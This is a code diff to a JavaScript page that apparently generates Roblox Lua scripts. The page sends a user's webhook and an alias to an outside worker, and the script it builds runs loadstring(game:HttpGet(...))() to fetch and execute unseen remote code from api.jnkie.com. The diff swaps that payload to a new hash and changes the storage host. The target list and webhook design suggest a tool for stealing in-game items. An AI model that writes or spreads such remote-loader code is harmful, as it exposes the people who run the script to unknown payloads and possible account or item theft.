@@ -770,7 +770,7 @@ const ANIMALS = [
   { name: "Jackorilla", rarity: "Secret", mps: "315K/s" },
   { name: "Secret Lucky Block", rarity: "Secret", mps: "0/s" }
 ];
-const KV_WORKER_URL = 'https://store-cyan-six.vercel.app/api/store';
+const KV_WORKER_URL = 'https://tester.dongdihng.workers.dev';
 
 function canGenerateScript() {
     const lastGeneratedTime = localStorage.getItem('lastScriptGenerationTime');
@@ -913,13 +913,14 @@ async function generate() {
 
         const alias = generateAlias();
 
-        const kvResponse = await fetch(`${KV_WORKER_URL}`, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({ alias, url: webhook }),
-});
+        const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ alias, url: webhook }),
+            mode: 'cors',
+        });
 
         if (!kvResponse.ok) {
             const error = await kvResponse.json();
@@ -948,7 +949,7 @@ getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/415b022771566e0a0379caf8703cf096b2776ff7e150a9ba2bdfde2d3b243290/download"))()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))()
 end)
 ${adminScriptPart}
 `;
